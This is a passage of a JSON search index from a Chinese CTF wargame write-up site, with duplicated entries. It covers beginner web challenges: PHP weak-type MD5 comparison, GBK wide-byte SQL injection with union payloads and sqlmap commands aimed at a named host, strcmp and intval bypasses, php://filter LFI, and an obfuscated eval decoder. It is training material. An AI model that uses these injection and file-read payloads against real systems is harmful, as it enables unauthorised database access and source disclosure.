            "text": "md5 collision\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#md5%20collision\n\n\nhttp://chinalover.sinaapp.com/web19/\n\n\nphp\n\n?php\n$md51 = md5('QNKCDZO');\n$a = @$_GET['a'];\n$md52 = @md5($a);\nif(isset($a)){\nif ($a != 'QNKCDZO' \n $md51 == $md52) {\n    echo \"nctf{*****************}\";\n} else {\n    echo \"false!!!\";\n}}\nelse{echo \"please input a\";}\n?\n\n\n\n\n解答思路\n\n\n\n\n本题考到了php的弱类型比较，当两个值使用==进行比较时，只是比较变量的值，而不会去比较变量的类型，md5('QNKCDZO')的hash值为 0e830400451993494058024219903391 ，对于 0ed+ 类型的数字，==会认为该值为0，所以只需满足md5($a)的值为0ed+类型即可满足条件，并且$a != 'QNKCDZO'，这里列出一些符合条件的值： \n\n\n\n\nphp\n  var_dump(md5('240610708') == md5('QNKCDZO'));\n  var_dump(md5('aabg7XSs') == md5('aabC9RqS'));\n  var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\n  var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\n  var_dump('0010e2' == '1e3');\n  var_dump('0x1234Ab' == '1193131');\n  var_dump('0xABCdef' == ' 0xABCdef');\n\n\n解题步骤\n\n\n\n\n输入参数\n$a=240610708\n得到flag \n\n\n\n\n漏洞挖掘思路\n\n\n\n\n由于php比较符智能\n转换\n导致的问题：http://www.vuln.cn/6423\n\n\nphp弱比较等一些问题的总结\n\n\n另一个总结\n\n\nphp漏洞汇总\n\n\n\n\n自动化解析\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "md5 collision"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_md5_collision/#md5-collision", 
            "text": "", 
            "title": "md5 collision"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_md5_collision/#_1", 
            "text": "http://ctf.nuptzj.cn/challenges#md5%20collision  http://chinalover.sinaapp.com/web19/  php ?php\n$md51 = md5('QNKCDZO');\n$a = @$_GET['a'];\n$md52 = @md5($a);\nif(isset($a)){\nif ($a != 'QNKCDZO'   $md51 == $md52) {\n    echo \"nctf{*****************}\";\n} else {\n    echo \"false!!!\";\n}}\nelse{echo \"please input a\";}\n?", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_md5_collision/#_2", 
            "text": "本题考到了php的弱类型比较，当两个值使用==进行比较时，只是比较变量的值，而不会去比较变量的类型，md5('QNKCDZO')的hash值为 0e830400451993494058024219903391 ，对于 0ed+ 类型的数字，==会认为该值为0，所以只需满足md5($a)的值为0ed+类型即可满足条件，并且$a != 'QNKCDZO'，这里列出一些符合条件的值：    php\n  var_dump(md5('240610708') == md5('QNKCDZO'));\n  var_dump(md5('aabg7XSs') == md5('aabC9RqS'));\n  var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\n  var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\n  var_dump('0010e2' == '1e3');\n  var_dump('0x1234Ab' == '1193131');\n  var_dump('0xABCdef' == ' 0xABCdef');", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_md5_collision/#_3", 
            "text": "输入参数 $a=240610708 得到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_md5_collision/#_4", 
            "text": "由于php比较符智能 转换 导致的问题：http://www.vuln.cn/6423  php弱比较等一些问题的总结  另一个总结  php漏洞汇总", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_md5_collision/#_5", 
            "text": "判断题目特征： web   php   md5 collision  设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_multi-byte_character/", 
            "text": "宽字节注入\n\n\n题目\n\n\n\n\nsql injection 3\n\n\nhttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\n\n\nyour sql:select id,title from news where id = '1' \n\n\nHello World!OVO \n\n\n\n\n解答思路\n\n\n\n\n判断出宽字符注入点，并且证实存在注入\n\n\n进行正常注入流程\n\n\n\n\n解题步骤\n\n\n\n\n\n\n手工注入\n\n\n\n\n\n\n判断注入点：加单引号，“ ' ”，发现被\\转义了 \n\n\n\n\n使用\n%df'\n宽字节注入，报错了 \n\n\n输入\nid=1%df' and 1=1 %23\n ，显示正常\n\n\n输入\nid=1%df' and 1=2 %23\n ，未显示任何信息，说明找到了注入点，接下来进行常规注入 \n\n\n判断列数：\nid=1%df' order by 2 %23\n，显示正常，当\n%df' order by 3 %23\n时，报错，确定为2列 \n\n\nunion联合查询，\nid=1%df' and 1=2 union select 1,2 %23\n \n\n\n获取当前数据库，\nid=1%df' and 1=2 union select 1,database() %23\n \n\n\n获取数据库名，\nid=1%df' and 1=2 union select 1,group_concat(table_name) from information_schema.TABLES where table_schema=0x7361652d6368696e616c6f766572 %23\n，这里数据库名使用16进制\n\n\n发现ctf1-4表，随便查看一个，查看ctf4表的列明，\nid=1%df' and 1=2 union select 1,group_concat(column_name) from information_schema.COLUMNS where table_name=0x63746634 %23\n，发现存在id，flag两列，我们直接查询flag的值\n\n\n获取flag值，\nid=1%df' and 1=2 union select 1,flag from ctf4 %23\n，得到flag \n\n\n\n\nPS: 需要添加\nand 1=2\n,将第一个返回结果置为空，才能显示出union查询的结果\n\n\n\n\n\n\nsqlmap注入\n\n\n\n\n\n\n在id后添加\n%df\n来实现注入\n\n\nshell\n  sqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27\" --search -C flag\n  --level 3 --risk 1 --thread 10\n\n\n\n\n--threads 10 //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10--level 3 //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5--risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全----search //后面跟参数 -D -T -C 搜索列（S），表（S）和或数据库名称（S） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样，结果有时候题目就是这么耿直对吧？ \n\n\n\n\n\n\n\n\n直接使用tamper\n\n\n\n\nunmagicquotes 主要用在宽字节注入，绕过magic_quotes/addslashes \n\n\n\n\nshell\n  sqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\" --search -C flag\n  --level 3 --risk 1 --thread 10 --tamper=\"unmagicquotes\"\n\n\n\n\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "宽字节注入"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_multi-byte_character/#_1", 
            "text": "", 
            "title": "宽字节注入"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_multi-byte_character/#_2", 
            "text": "", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_multi-byte_character/#sql-injection-3", 
            "text": "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1  your sql:select id,title from news where id = '1'   Hello World!OVO", 
            "title": "sql injection 3"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_multi-byte_character/#_3", 
            "text": "判断出宽字符注入点，并且证实存在注入  进行正常注入流程", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_multi-byte_character/#_4", 
            "text": "手工注入    判断注入点：加单引号，“ ' ”，发现被\\转义了    使用 %df' 宽字节注入，报错了   输入 id=1%df' and 1=1 %23  ，显示正常  输入 id=1%df' and 1=2 %23  ，未显示任何信息，说明找到了注入点，接下来进行常规注入   判断列数： id=1%df' order by 2 %23 ，显示正常，当 %df' order by 3 %23 时，报错，确定为2列   union联合查询， id=1%df' and 1=2 union select 1,2 %23    获取当前数据库， id=1%df' and 1=2 union select 1,database() %23    获取数据库名， id=1%df' and 1=2 union select 1,group_concat(table_name) from information_schema.TABLES where table_schema=0x7361652d6368696e616c6f766572 %23 ，这里数据库名使用16进制  发现ctf1-4表，随便查看一个，查看ctf4表的列明， id=1%df' and 1=2 union select 1,group_concat(column_name) from information_schema.COLUMNS where table_name=0x63746634 %23 ，发现存在id，flag两列，我们直接查询flag的值  获取flag值， id=1%df' and 1=2 union select 1,flag from ctf4 %23 ，得到flag    PS: 需要添加 and 1=2 ,将第一个返回结果置为空，才能显示出union查询的结果    sqlmap注入    在id后添加 %df 来实现注入  shell\n  sqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27\" --search -C flag\n  --level 3 --risk 1 --thread 10   --threads 10 //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10--level 3 //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5--risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全----search //后面跟参数 -D -T -C 搜索列（S），表（S）和或数据库名称（S） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样，结果有时候题目就是这么耿直对吧？      直接使用tamper   unmagicquotes 主要用在宽字节注入，绕过magic_quotes/addslashes    shell\n  sqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\" --search -C flag\n  --level 3 --risk 1 --thread 10 --tamper=\"unmagicquotes\"", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_multi-byte_character/#_5", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_multi-byte_character/#_6", 
            "text": "TODO    判断题目特征： web   php   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_mysql/", 
            "text": "题目\n\n\n\n\nMYSQL\n\n\nhttp://chinalover.sinaapp.com/web11/\n\n\n\n\n解答思路\n\n\n\n\n\n\nmysql中float等类型存在精度问题，当查询结果中存在小数位，或者使用科学计数法表示，mysql查询后会将结果四舍五入或者省略掉末位后输出，但这\n不是\n此考题的考点\n\n\n\n\n\n\n本题的考点：程序的逻辑漏洞\n\n\n\n\n\n\n由于\n$_GET[id]==1024\n的比较中，不应该使用\n$_GET[id]\n，而应该使用过滤之后的\n$id\n，正是由于\n1024.1\n在过滤后为1024，即flag存在的数据项，又可以绕过判断条件，将flag显示出来\n\n\n\n\n逻辑漏洞的查找\n重点查看判断语句\n\n\n\n\n解题步骤\n\n\n\n\n访问地址：\nhttp://chinalover.sinaapp.com/web11/robots.txt\n\n\n\n\n\n\n```php\n别太开心，flag不在这，这个文件的用途你看完了？\n在CTF比赛中，这个文件往往存放着提示信息\n\n\nTIP:sql.php\n\n\n?php\nif($_GET[id]) {\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $id = intval($_GET[id]);\n  $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\n  if ($_GET[id]==1024) {\n      echo \"\nno! try again\n\";\n  }\n  else{\n    echo($query[content]);\n  }\n}\n?\n\n```\n\n\n\n\n\n\n\n\n根据提示，访问sql.php，并提交参数\n?id=1024.1\n\n\n\n\n\n\n得到返回结果\n\n\n\n\n\n\n\n\nthe flag is:nctf{query_in_mysql} \n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "[ctf.nuptzj.cn] mysql"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_mysql/#_1", 
            "text": "", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_mysql/#mysql", 
            "text": "http://chinalover.sinaapp.com/web11/", 
            "title": "MYSQL"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_mysql/#_2", 
            "text": "mysql中float等类型存在精度问题，当查询结果中存在小数位，或者使用科学计数法表示，mysql查询后会将结果四舍五入或者省略掉末位后输出，但这 不是 此考题的考点    本题的考点：程序的逻辑漏洞    由于 $_GET[id]==1024 的比较中，不应该使用 $_GET[id] ，而应该使用过滤之后的 $id ，正是由于 1024.1 在过滤后为1024，即flag存在的数据项，又可以绕过判断条件，将flag显示出来   逻辑漏洞的查找 重点查看判断语句", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_mysql/#_3", 
            "text": "访问地址： http://chinalover.sinaapp.com/web11/robots.txt    ```php\n别太开心，flag不在这，这个文件的用途你看完了？\n在CTF比赛中，这个文件往往存放着提示信息  TIP:sql.php  ?php\nif($_GET[id]) {\n   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\n  mysql_select_db(SAE_MYSQL_DB);\n  $id = intval($_GET[id]);\n  $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\"));\n  if ($_GET[id]==1024) {\n      echo \" no! try again \";\n  }\n  else{\n    echo($query[content]);\n  }\n}\n? \n```     根据提示，访问sql.php，并提交参数 ?id=1024.1    得到返回结果     the flag is:nctf{query_in_mysql}", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_mysql/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_mysql/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_pass check/", 
            "text": "pass check\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#pass%20check\n\n\nphp\n\n?php\n$pass=@$_POST['pass'];\n$pass1=***********;//被隐藏起来的密码\nif(isset($pass))\n{\nif(@!strcmp($pass,$pass1)){\necho \"flag:nctf{*}\";\n}else{\necho \"the pass is wrong!\";\n}\n}else{\necho \"please input pass!\";\n}\n?\n\n\n\n\n解答思路\n\n\n\n\n\n\n\n\nint strcmp ( string  $str1 , string \\$str2 )// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 \n 0； 如果 str1 大于 str2 返回 \n 0；如果两者相等，返回 0。 \n\n\n\n\n\n\n\n\n\n\n可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL,而判断使用的是==，NULL==0是 bool(true) \n\n\n\n\n\n\n\n\n解题步骤\n\n\n\n\nhackbar提交post数据：\n\n\n\n\nhttp\n   pass[]=a\n\n   得到flag\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "[ctf.nuptzj.cn] pass check"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_pass check/#pass-check", 
            "text": "", 
            "title": "pass check"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_pass check/#_1", 
            "text": "http://ctf.nuptzj.cn/challenges#pass%20check  php ?php\n$pass=@$_POST['pass'];\n$pass1=***********;//被隐藏起来的密码\nif(isset($pass))\n{\nif(@!strcmp($pass,$pass1)){\necho \"flag:nctf{*}\";\n}else{\necho \"the pass is wrong!\";\n}\n}else{\necho \"please input pass!\";\n}\n?", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_pass check/#_2", 
            "text": "int strcmp ( string  $str1 , string \\$str2 )// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回   0； 如果 str1 大于 str2 返回   0；如果两者相等，返回 0。       可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL,而判断使用的是==，NULL==0是 bool(true)", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_pass check/#_3", 
            "text": "hackbar提交post数据：   http\n   pass[]=a \n   得到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_pass check/#_4", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_pass check/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_0x/", 
            "text": "起名字真难\n\n\n题目\n\n\n\n\n/x00\n\n\nhttp://ctf.nuptzj.cn/challenges#%E8%B5%B7%E5%90%8D%E5%AD%97%E7%9C%9F%E9%9A%BE\n\n\nphp\n\n?php\n function noother_says_correct($number)\n{\n        $one = ord('1');\n        $nine = ord('9');\n        for ($i = 0; $i \n strlen($number); $i++)\n        {   \n                $digit = ord($number{$i});\n                if ( ($digit \n= $one) \n ($digit \n= $nine) )\n                {\n                        return false;\n                }\n        }\n           return $number == '54975581388';\n}\n$flag='*******';\nif(noother_says_correct($_GET['key']))\n    echo $flag;\nelse \n    echo 'access denied';\n?\n\n\n\n\n解答思路\n\n\n\n\n\n\n\n\n十六进制与字符串进行比较运算时，例子如下：\n\n\nphp\n\"0x1e240\"==\"123456\"     //true\n\"0x1e240\"==123456       //true\n\"0x1e240\"==\"1e240\"      //false\n\n\n当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等 \n\n\n\n\n\n\n\n\n解题步骤\n\n\n\n\nurl后面添加\n?key=0xccccccccc\n，提交，得到flag\n\n\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "起名字真难"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_0x/#_1", 
            "text": "", 
            "title": "起名字真难"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_0x/#_2", 
            "text": "", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_0x/#x00", 
            "text": "http://ctf.nuptzj.cn/challenges#%E8%B5%B7%E5%90%8D%E5%AD%97%E7%9C%9F%E9%9A%BE  php ?php\n function noother_says_correct($number)\n{\n        $one = ord('1');\n        $nine = ord('9');\n        for ($i = 0; $i   strlen($number); $i++)\n        {   \n                $digit = ord($number{$i});\n                if ( ($digit  = $one)   ($digit  = $nine) )\n                {\n                        return false;\n                }\n        }\n           return $number == '54975581388';\n}\n$flag='*******';\nif(noother_says_correct($_GET['key']))\n    echo $flag;\nelse \n    echo 'access denied';\n?", 
            "title": "/x00"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_0x/#_3", 
            "text": "十六进制与字符串进行比较运算时，例子如下：  php\n\"0x1e240\"==\"123456\"     //true\n\"0x1e240\"==123456       //true\n\"0x1e240\"==\"1e240\"      //false  当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_0x/#_4", 
            "text": "url后面添加 ?key=0xccccccccc ，提交，得到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_0x/#_5", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_0x/#_6", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_LFI/", 
            "text": "题目\n\n\n\n\nphp LFI\n\n\nhttp://4.chinalover.sinaapp.com/web7/index.php?file=show.php\n\n\n\n\n解答思路\n\n\n\n\n由于注释在php解析成html之后会被删除，所以，flag可能会被藏在此处\n\n\n使用base64编码的方式将index.php读取出来\n\n\n\n\n解题步骤\n\n\n\n\n提交参数：\n\n\n\n\nphp\n   ?file=php://filter//read=convert.base64-encode/resource=index.php\n\n2. 得到返回结果，在注释中找到\n\n\n\n\nflag:nctf{edulcni_elif_lacol_si_siht}\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "[ctf.nuptzj.cn] php LFI"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_LFI/#_1", 
            "text": "", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_LFI/#php-lfi", 
            "text": "http://4.chinalover.sinaapp.com/web7/index.php?file=show.php", 
            "title": "php LFI"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_LFI/#_2", 
            "text": "由于注释在php解析成html之后会被删除，所以，flag可能会被藏在此处  使用base64编码的方式将index.php读取出来", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_LFI/#_3", 
            "text": "提交参数：   php\n   ?file=php://filter//read=convert.base64-encode/resource=index.php \n2. 得到返回结果，在注释中找到   flag:nctf{edulcni_elif_lacol_si_siht}", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_LFI/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_LFI/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_decode/", 
            "text": "题目\n\n\n\n\nphp decode\n\n\n```php\n\n?php\nfunction CLsI($ZzvSWE) {\n\n\n$ZzvSWE = gzinflate(base64_decode($ZzvSWE));\n\nfor ($i = 0; $i \n strlen($ZzvSWE); $i++) {\n\n    $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);\n\n}\n\nreturn $ZzvSWE;\n\n\n\n}eval(CLsI(\"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==\"));?\n\n```\n\n\n\n\n解答思路\n\n\n\n\n对于php代码，可以尝试运行给出的代码，并输出各个变量的值\n\n\n\n\n解题步骤\n\n\n\n\n修改代码，在for循环下面添加如下代码：\n\n\n\n\nphp\n   echo $ZzvSWE;\n\n\n\n\n在php\n在线代码调试网站\n中运行该程序，得到结果\n\n\n\n\n\n\nflag:nctf{gzip_base64_hhhhhh}\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "[ctf.nuptzj.cn] php decode"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_decode/#_1", 
            "text": "", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_decode/#php-decode", 
            "text": "```php ?php\nfunction CLsI($ZzvSWE) {  $ZzvSWE = gzinflate(base64_decode($ZzvSWE));\n\nfor ($i = 0; $i   strlen($ZzvSWE); $i++) {\n\n    $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);\n\n}\n\nreturn $ZzvSWE;  }eval(CLsI(\"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==\"));? \n```", 
            "title": "php decode"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_decode/#_2", 
            "text": "对于php代码，可以尝试运行给出的代码，并输出各个变量的值", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_decode/#_3", 
            "text": "修改代码，在for循环下面添加如下代码：   php\n   echo $ZzvSWE;   在php 在线代码调试网站 中运行该程序，得到结果    flag:nctf{gzip_base64_hhhhhh}", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_decode/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_php_decode/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao/", 
            "text": "签到\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#%E7%AD%BE%E5%88%B0%E9%A2%98\n\n\nhttp://chinalover.sinaapp.com/web1/\n\n\n\n\n解答思路\n\n\n\n\n查看网页源代码，得到flag\n\n\n\n\n解题步骤\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n判断题目特征：\nweb\n \nsimple\n \nwebpage_source\n\n\n设定题目难度等级\nlevel\n为simple，采用查看源代码的方式(将源代码中的字段隐藏属性去掉，或者将注释改为可见)，依据常见的flag格式，匹配到\nflag\n，并对其赋值，自动提交", 
            "title": "签到"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao/#_1", 
            "text": "", 
            "title": "签到"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao/#_2", 
            "text": "http://ctf.nuptzj.cn/challenges#%E7%AD%BE%E5%88%B0%E9%A2%98  http://chinalover.sinaapp.com/web1/", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao/#_3", 
            "text": "查看网页源代码，得到flag", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao/#_4", 
            "text": "无", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao/#_5", 
            "text": "判断题目特征： web   simple   webpage_source  设定题目难度等级 level 为simple，采用查看源代码的方式(将源代码中的字段隐藏属性去掉，或者将注释改为可见)，依据常见的flag格式，匹配到 flag ，并对其赋值，自动提交", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao2/", 
            "text": "签到2\n\n\n题目\n\n\n\n\nhttp://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php\n\n\n```html\n\n\n\n\n尚未登录或口令错误\n\n  \n输入框：\n\n  请输入口令：zhimakaimen\n  \n\n\n\n\n\n```\n\n\n\n\n解答思路\n\n\n\n\n检查可能做访问控制的参数，maxlength=10\n\n\n而口令zhimakaimen长度为11，所以确定该题目需要bp截获提交修改post中的数据\n\n\n\n\n解题步骤\n\n\n\n\n略\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n待实现\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "签到2"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao2/#2", 
            "text": "", 
            "title": "签到2"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_qiandao2/#_1", 
            "text": "http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php  ```html  \n尚未登录或口令错误 \n   输入框： \n  请输入口令：zhimakaimen\n     \n```", 
            "title": "题目"
        }, 
        {
